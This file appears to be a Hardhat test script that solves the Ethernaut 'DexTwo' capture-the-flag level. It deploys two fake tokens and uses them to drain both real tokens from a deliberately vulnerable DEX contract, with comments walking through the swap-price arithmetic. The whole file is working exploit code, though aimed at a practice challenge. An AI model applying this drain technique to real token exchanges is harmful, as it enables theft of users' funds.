const { expect } = require("chai")
const { createChallenge, submitLevel } = require("./utils")

let s1, attacker, challenge, tx, bt1, bt2

before(async () => {
    ;[s1] = await ethers.getSigners()
    const challengeAddress = await createChallenge("0xf59112032D54862E199626F55cFad4F8a3b0Fce9")
    challenge = await ethers.getContractAt("DexTwo", challengeAddress)

    const BT1Factory = await ethers.getContractFactory("BadToken1")
    bt1 = await BT1Factory.deploy()
    const BT2Factory = await ethers.getContractFactory("BadToken2")
    bt2 = await BT2Factory.deploy()
})

it("solves the challenge", async function () {
    let t1 = challenge.token1()
    let t2 = challenge.token2()

    // swapAmount = amount * TOBalanceDex / FROMBalanceDex => FROMToken is the fake token we are going to provide =>
    // we need to steal 100 tokens ( == swapAmount) --- FROMBalanceDex = 100 =>
    // 100 = ???amount * 100 / ???FROMBalanceDex => to satisfy the equation, we cn set amount = 1 and FROMBalanceDex = 1 =>
    // this means, we need to send 1 fake token to the Dex (1 of each : bt1 and bt2) &nd we also need to approve them
    // so that the swap method in the Dex can call "transferFrom"
    tx = await bt1.transfer(challenge.address, 1)
    await tx.wait()
    tx = await bt2.transfer(challenge.address, 1)
    await tx.wait()
    tx = await bt1.approve(challenge.address, 1)
    await tx.wait()
    tx = await bt2.approve(challenge.address, 1)
    await tx.wait()

    try {
        //now, we simply swap 1 fake token for 100 Dex tokens
        tx = await challenge.swap(bt1.address, t1, 1)
        await tx.wait()
        tx = await challenge.swap(bt2.address, t2, 1)
        await tx.wait()
        console.log("Dex balance T1: ", await challenge.balanceOf(t1, challenge.address))
        console.log("Dex balance T2: ", await challenge.balanceOf(t2, challenge.address))
        console.log("Attacker balance T1: ", await challenge.balanceOf(t1, s1.address))
        console.log("Attacker balance T2: ", await challenge.balanceOf(t2, s1.address))
    } catch (err) {
        console.log(err)
    }
})

after(async () => {
    expect(await submitLevel(challenge.address), "level not solved").to.be.true
    //expect(1).to.eq(1)
})
